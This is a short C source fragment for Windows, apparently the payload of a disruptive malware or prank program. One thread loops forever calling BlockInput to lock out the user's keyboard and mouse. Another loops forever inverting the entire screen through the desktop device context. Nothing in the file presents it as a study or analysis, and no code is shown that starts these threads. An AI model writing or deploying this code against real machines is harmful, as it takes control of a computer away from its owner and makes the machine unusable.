#include <windows.h>

DWORD WINAPI thread(LPVOID parameters) {
		while(1)
		{
			BlockInput(TRUE);
		}
	}
	DWORD WINAPI Inverter(LPVOID parameters)
	{
		int X = GetSystemMetrics(SM_CXSCREEN);
		int Y = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(HWND_DESKTOP);
		
		while(1)
		{
			BitBlt(hdc, 0, 0, X, Y, hdc, NULL, NULL, NOTSRCCOPY);
		}
	}
